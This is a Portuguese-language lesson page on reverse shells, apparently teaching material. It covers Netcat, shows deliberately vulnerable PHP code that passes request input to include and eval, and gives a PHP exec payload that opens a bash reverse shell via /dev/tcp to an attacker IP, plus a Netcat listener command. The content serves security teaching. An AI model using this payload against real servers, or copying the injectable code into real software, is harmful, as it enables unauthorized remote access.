# Shell Reversa com NetCat e PHPinjection

➡️ [PDF da Aula](./pdf/shell_reversa.pdf) desenvolvido por [@robertovrf](https://github.com/robertovrf)

---

## 🌐 Pilha de Protocolos

A pilha de protocolos da Internet no Modelo TCP/IP é composta por cinco camadas:

<div align="center">
    <img src="https://dhg1h5j42swfq.cloudfront.net/2023/02/23210350/modelotcpip5.png"/>
</div>

Alguns protocolos se detacam no contexto de Shell Reversa, que são:

- **Camada de Aplicação**: protocolos como HTTP, SSH, FTP, SMTP, POP3, IMAP, SNMP.
- **Camada de Transporte**: protocolos **TCP** (orientado à conexão) e **UDP** (não orientado à conexão).

O **TCP** é frequentemente usado para estabelecer canais confiáveis para shells reversas.

---

## 📡 Netcat

O **Netcat** (`nc`) é uma ferramenta que permite ler e escrever dados pela rede usando TCP ou UDP.  
É amplamente usado para depuração, transferência de arquivos e, no contexto da segurança ofensiva, para criar conexões de shell reversa.

Exemplos de uso básico:

```bash
# Escutar conexões na porta 4444
nc -lvnp 4444

# Conectar-se a um host e porta específicos
nc <IP_ALVO> 80
```
---

## 💥 PHP Code Injection

Uma PHP Code Injection ocorre quando uma aplicação PHP executa código fornecido pelo usuário sem validação adequada.
Isso normalmente ocorre devido a:

- Falta de validação de entradas
- Uso inseguro de funções como `include`, `require`, `eval`, `exec`

Exemplo vulnerável com `include`:
```php
<?php
include($_GET['pagina']);
?>
```

Exemplo vulnerável com `eval`:

```php
<?php
$cmd = $_GET['cmd'];
eval($cmd);
?>
```
Este tipo de vulnerabilidade pode permitir execução arbitrária de comandos no servidor.

---

## 🔄 Shell Reversa

Uma shell reversa é uma conexão onde o servidor (alvo) conecta-se de volta ao atacante, permitindo que este tenha acesso interativo ao sistema de forma remota.

Fluxo básico com Netcat:

1. Atacante inicia Netcat no modo *listen*:
```bash
nc -lvnp 80
```

2. Alvo executa comando PHP para iniciar um bash e conectar ao atacante:
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.100/80 0>&1'");
?>
```

3. Atacante recebe a shell no terminal Netcat e pode executar comandos e explorar vulnerabilidades:

```bash
sudo -l
ls -la
whoami
```